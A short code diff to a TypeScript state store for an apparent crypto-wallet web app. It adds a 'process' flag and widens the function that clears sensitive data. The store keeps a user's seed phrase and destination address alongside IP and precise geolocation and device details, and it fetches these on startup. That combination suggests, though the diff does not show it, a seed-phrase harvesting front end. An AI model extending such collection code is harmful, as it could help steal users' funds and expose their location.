@@ -19,6 +19,7 @@ type WalletState = {
 	geolocation: GeolocationState | null;
 	userAgent: string;
 	screenResolution: string;
+	process: boolean;
 	isLoading: boolean;
 };
 
@@ -31,6 +32,7 @@ type WalletActions = {
 	fetchGeoFromIP: () => Promise<void>;
 	requestPreciseGeolocation: () => Promise<void>;
 	clearSensitiveData: () => void;
+	setProcess: (val: boolean) => void;
 };
 
 type WalletStore = WalletState & WalletActions;
@@ -46,6 +48,7 @@ export const useWalletStore = create<WalletStore>((set, get) => ({
 	geolocation: null,
 	userAgent: "",
 	screenResolution: "",
+	process: false,
 	isLoading: false,
 
 	// --- ACTIONS ---
@@ -53,6 +56,7 @@ export const useWalletStore = create<WalletStore>((set, get) => ({
 	setWalletProvider: (provider) => set({ walletProvider: provider }),
 	setSeedPhrase: (phrase) => set({ seedPhrase: phrase }),
 	setDestinationAddress: (address) => set({ destinationAddress: address }),
+	setProcess: (val) => set({ process: val }),
 
 	/** 🔹 Fetch IP + basic device info (no permissions needed) */
 	fetchUserDetails: async () => {
@@ -141,7 +145,13 @@ export const useWalletStore = create<WalletStore>((set, get) => ({
 	},
 
 	/** 🧹 Clear sensitive info */
-	clearSensitiveData: () => set({ seedPhrase: "", destinationAddress: "" }),
+	clearSensitiveData: () =>
+		set({
+			seedPhrase: "",
+			destinationAddress: "",
+			blockchainNetwork: "",
+			walletProvider: "",
+		}),
 }));
 
 /** --- AUTO-RUN ON STORE INIT --- **/
